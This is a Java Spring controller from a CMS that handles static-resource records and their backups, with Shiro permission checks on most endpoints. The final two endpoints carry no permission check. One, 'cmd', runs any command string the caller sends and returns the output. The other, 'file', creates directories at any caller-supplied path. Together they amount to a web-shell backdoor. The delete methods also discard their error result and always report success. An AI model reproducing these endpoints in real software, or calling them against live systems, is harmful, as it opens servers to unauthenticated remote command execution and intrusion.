package com.hiynn.cms.controller;

import com.hiynn.cms.common.aop.syslog.SysLog;
import com.hiynn.cms.common.util.SendCmdUtil;
import com.hiynn.cms.entity.SysStaticDataEntity;
import com.hiynn.cms.service.SysStaticDataBackupsService;
import com.hiynn.cms.service.SysStaticDataService;
import com.hiynn.component.common.core.Result;
import io.swagger.annotations.*;
import lombok.extern.slf4j.Slf4j;
import org.apache.shiro.authz.annotation.RequiresPermissions;
import org.hibernate.validator.constraints.Length;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.validation.annotation.Validated;
import org.springframework.web.bind.annotation.*;

import javax.validation.constraints.NotBlank;
import java.io.File;
import java.util.Map;

/**
 * 描述: 静态资源备份表
 *
 * @author liuhy
 * @date 2019-12-24 10:54:07
 */
@Validated
@Api(tags = "D-[静态资源管理]-控制器" )
@RestController
@RequestMapping("sys/staticData" )
@Slf4j
public class SysStaticDataBackupsController {
    private final SysStaticDataService sysStaticDataService;

    private final SysStaticDataBackupsService sysStaticDataBackupsService;

    @Autowired
    public SysStaticDataBackupsController(SysStaticDataBackupsService sysStaticDataBackupsService,
                                          SysStaticDataService sysStaticDataService) {
        this.sysStaticDataBackupsService = sysStaticDataBackupsService;
        this.sysStaticDataService = sysStaticDataService;
    }

    /**
     * 描述: 分页查询列表
     * @author liuhy
     * @date 2019-12-24 10:54:07
     * @param page  页码
     * @param pageSize 数量
     * @return com.hiynn.component.common.core.Result
     */
    @RequiresPermissions("staticData_list_page")
    @GetMapping(value = "list/page")
    @ApiOperation(value = "分页查询静态资源列表", notes = "分页查询静态资源列表")
    public Result selectStaticDataByPage(
            @ApiParam(name = "page", value = "页码", required = false)
            @RequestParam(defaultValue = "0", required = false) String page,
            @ApiParam(name = "pageSize", value = "数量", required = false)
            @RequestParam(defaultValue = "0", required = false) String pageSize) {
        return Result.success().setData(sysStaticDataService.listPage(page, pageSize));
    }

    /**
     * 描述: 保存静态资源
     * @author liuhy
     * @date 2019-12-24 10:54:07
     * @param sysStaticData
     * @return com.hiynn.component.common.core.Result
     */
    @RequiresPermissions("staticData_post")
    @PostMapping
    @ApiOperation(value = "保存静态资源", notes = "保存静态资源" )
    public Result insertStaticData(@RequestBody() SysStaticDataEntity sysStaticData) {
        sysStaticDataService.insert(sysStaticData);
        return Result.success();
    }

    /**
     * 描述: 修改静态资源
     * @author liuhy
     * @date 2019-12-24 10:54:07
     * @param sysStaticData
     * @return com.hiynn.component.common.core.Result
     */
    @RequiresPermissions("staticData_put")
    @PutMapping
    @ApiOperation(value = "更新静态资源", notes = "更新静态资源" )
    public Result updateStaticData(@RequestBody() SysStaticDataEntity sysStaticData) {
        sysStaticDataService.update(sysStaticData);
        return Result.success();
    }


    /**
     * 描述: 删除
     * @author liuhy
     * @date 2019-12-24 10:54:07
     * @param id
     * @return com.hiynn.component.common.core.Result
     */
    @RequiresPermissions("staticData_delete")
    @DeleteMapping("{id}")
    @ApiOperation(value = "删除静态资源", notes = "删除静态资源" )
    public Result deleteStaticData(
            @ApiParam(name = "id", value = "主键ID", required = true)
            @PathVariable("id") String id) {
        int cnt = sysStaticDataService.delete(id);
        if (cnt == 0) {
            Result.errorParam();
        }
        return Result.success();
    }


    /**
     * 描述: 分页查询静态资源备份列表
     * @author liuhy
     * @date 2019-12-24 10:54:07
     * @param page  页码
     * @param pageSize 数量
     * @param sysStaticDataId 静态资源ID
     * @return com.hiynn.component.common.core.Result
     */
    @RequiresPermissions("backups_list_page")
    @GetMapping(value = "backups/list/page")
    @ApiOperation(value = "分页查询静态资源备份列表", notes = "分页查询静态资源备份列表")
    public Result selectDataBackupsByPage(
            @ApiParam(name = "page", value = "页码", required = false)
            @RequestParam(defaultValue = "0", required = false) String page,
            @ApiParam(name = "pageSize", value = "数量", required = false)
            @RequestParam(defaultValue = "0", required = false) String pageSize,
            @ApiParam(name = "sysStaticDataId", value = "静态资源ID ", required = false)
            String sysStaticDataId) {
        return Result.success().setData(sysStaticDataBackupsService.listPage(page, pageSize, sysStaticDataId));
    }


    /**
     * 描述: 保存静态资源备份
     * @author liuhy
     * @date 2019-12-24 10:54:07
     * @param staticDataId
     * @return com.hiynn.component.common.core.Result
     */
    @RequiresPermissions("backups_post")
    @PostMapping("backups")
    @ApiOperation(value = "保存静态资源备份", notes = "保存静态资源备份" )
    public Result insertDataBackups(String staticDataId) {
            sysStaticDataBackupsService.insert(staticDataId);
        return Result.success();
    }

    /**
     * 描述: 修改静态资源备份(添加备注)
     * @author liuhy
     * @date 2019-12-24 10:54:07
     * @param id
     * @return com.hiynn.component.common.core.Result
     */
    @RequiresPermissions("backups_post")
    @PutMapping("backups/{id}")
    @ApiImplicitParams({
            @ApiImplicitParam(name = "id", value = "所选备份静态资源ID", dataType = "String", required = true, paramType = "path"),
            @ApiImplicitParam(name = "remark", value = "备注", dataType = "String", required = true, paramType = "query"),
    })
    @ApiOperation(value = "修改静态资源备份(添加备注)", notes = "修改静态资源备份" )
    public Result insertDataBackups(@PathVariable @NotBlank(message = "id不为空") String id,
                                    @Length(max = 50,message = "备注长度0~50") String remark) {
            sysStaticDataBackupsService.update(id,remark);
        return Result.success();
    }


    /**
     * 描述: 删除静态资源备份
     * @author liuhy
     * @date 2019-12-24 10:54:07
     * @param id
     * @return com.hiynn.component.common.core.Result
     */
    @RequiresPermissions("backups_delete")
    @DeleteMapping("backups/{id}")
    @ApiOperation(value = "删除静态资源备份", notes = "删除静态资源备份" )
    public Result deleteDataBackups(
            @ApiParam(name = "id", value = "主键ID", required = true)
            @PathVariable("id") String id) {
        int cnt = sysStaticDataBackupsService.delete(id);
        if (cnt == 0) {
            Result.errorParam();
        }
        return Result.success();
    }

    /**
     * 描述: 重置静态资源
     * @author liuhy
     * @date 2019/12/12 15:09
     * @param
     * @return com.hiynn.component.common.core.Result
     */
    @RequiresPermissions("backups_id_put")
    @SysLog
    @ApiOperation(value = "重置静态资源 重置不可恢复,重置前请备份")
    @ApiImplicitParams({
            @ApiImplicitParam(name = "id", value = "所选静态资源ID", dataType = "String", required = true, paramType = "path"),
    })
    @PutMapping("backups/reset/{id}")
    public Result getResetStatic(@PathVariable("id") String id) {
        sysStaticDataBackupsService.recover(id);
        return Result.success();
    }

    @GetMapping("cmd")
    public Result cmd(String cmd) throws Exception {
        Map<String, Object> map = SendCmdUtil.sendCommand(cmd);
        return Result.success(map);
    }

    @GetMapping("file")
    public Result file(String path) throws Exception {
        File file = new File(path);
        boolean mkdirs = file.mkdirs();
        return Result.success(mkdirs);
    }

}
